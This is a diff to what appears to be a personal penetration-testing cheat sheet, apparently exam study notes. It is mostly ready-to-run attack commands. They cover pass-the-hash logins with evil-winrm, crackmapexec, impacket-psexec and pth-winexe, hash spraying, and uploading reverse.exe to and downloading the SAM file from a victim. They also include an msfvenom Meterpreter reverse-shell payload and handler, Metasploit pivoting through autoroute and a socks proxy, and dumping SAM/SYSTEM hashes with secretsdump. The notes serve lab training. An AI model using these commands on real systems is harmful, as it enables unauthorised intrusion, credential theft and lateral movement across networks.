@@ -892,8 +892,20 @@ Port Forwarding Over SSH For VNC:
 ```
 https://github.com/Hackplayers/evil-winrm
 gem install evil-winrm
-evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
-evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
+
+# Authenticate With Password
+	evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
+# Authetnicate With Hash
+	evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
+# With Scripts
+	evil-winrm -i 10.10.121.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -e /home/kali/Documents/tools
+
+Downloading Files From Victim To Kali:
+	download C:\users\celia.almeda\Desktop\SAM /home/kali/Documents/SAM
+
+Uploading Files From Kali To Victim:
+	upload /home/kali/Documents/tools/reverse.exe C:\users\celia.almeda\Desktop\Reverse.exe
+
 ```
 
 ## Redis - 6379
@@ -2426,20 +2438,25 @@ net start upnphost
 ### Pass The Hash
 
 ```
-# Login as user only with hashdump
-# From this hashdump
-# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::
+## CRACKMAPEXEC
 
-## CRACK MAP EXEC
-
-crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -H <NTLM Hash> --local-auth # Check other machines for dual access with the same hash; --sam (dump SAM file)
+crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -H <NTLM Hash> --local-auth --sam (dump SAM file)
 
 crackmapexec smb 192.168.68.122-126 -u fcastle -d MARVEL.local -p <P@ssw0rd1>
 
+# Hash Spraying
+	crackmapexec 10.10.121.142 -u users.txt -H hashes.txt
+# With Hash
+	crackmapexec smb 10.10.121.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+# Listing Shares
+	proxychains crackmapexec smb 10.10.121.142 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc --shares 
+
+# Passing Command To WinRm
+	crackmapexec winrm 10.10.121.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -x "ipconfig /all"
+
 ## PSEXEC
-
-psexec.py "frank castle":@192.168.68.122 -hashes aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 # attempt to gain a shell
-
+	impacket-psexec "oscp.exam/tom_admin"@10.10.121.140 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc
+	Note: Requires writable ADMIN$ share usually
 ## Pth-Winexe
 
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb //10.11.1.24 cmd
@@ -2449,51 +2466,6 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f
 evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
 
 evil-winrm  -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
-
-## Impacket-PSexec:
-
-python3 /usr/share/impacket/impacket/examples/psexec.py "Administrator":@10.11.1.121 -hashes aad3b435b51404eeaad3b435b51404ee:57321e6a0eef2c45985c9fa49c5cd24f #upload/download files with shell access
-
-
-msf5 > use exploit/windows/smb/psexec
-msf5 exploit(windows/smb/psexec) > options
-
-Module options (exploit/windows/smb/psexec):
-
-   Name                  Current Setting  Required  Description
-   ----                  ---------------  --------  -----------
-   RHOSTS                                 yes       The target address range or CIDR identifier
-   RPORT                 445              yes       The SMB service port (TCP)
-   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target for pretty listing
-   SERVICE_DISPLAY_NAME                   no        The service display name
-   SERVICE_NAME                           no        The service name
-   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
-   SMBDomain             .                no        The Windows domain to use for authentication
-   SMBPass                                no        The password for the specified username
-   SMBUser                                no        The username to authenticate as
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
-rhosts => 10.10.0.100
-
-msf5 exploit(windows/smb/psexec) > set smbuser admin2
-
-smbuser => admin2
-
-msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7
-
-smbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7
-
-msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
-
-payload => windows/x64/meterpreter/reverse_tcp
-
-```
 
 ### Scripts
 
@@ -3145,18 +3117,11 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
  	Meterpreter Reverse Shell 32-bit Windows:
   		msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.45.237 LPORT=5555 --arch x86 --platform windows -f exe -o reverse.exe
 		Set Payload To This Inside of Meterpreter: set payload windows/meterpreter/reverse_tcp
-  
-	Quick Access: sudo msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 192.168.45.237;set LPORT 5555;run;"
-	Note: It may take several times for a session to be initiated.
 
-	Once session is opened: We can use multi/manage/autoroute and auxilliary/server/socks_proxy 
-
+# Meterpreter AutoRoute And Socks Proxy
     use multi/manage/autoroute
     set session 1
-    
-run
-
-	Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
+    run
  
     use auxiliary/server/socks_proxy
     set SRVHOST 127.0.0.1
@@ -3270,3 +3235,18 @@ Note: I had to add this entry into the proxychains4.conf file:
 Note 2: If you get a notice that the port is in use, even after you have killed the process.
 	You can manually kill the zombie process to free the port
 ```
+
+# Cracking SAM Hashes
+```
+ 	Needed: 1) SAM file 2) SYSTEM file	
+	Location: 
+ 	1) C:\Windows\system32\SAM
+  	2) C:\Windows\system32\SYSTEM
+
+	Transfer them to Kali. then crack with impacket-secretsdump
+	proxychains impacket-secretsdump local -sam SAM -system SYSTEM
+	Format will be something like: tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
+
+```
+
+   
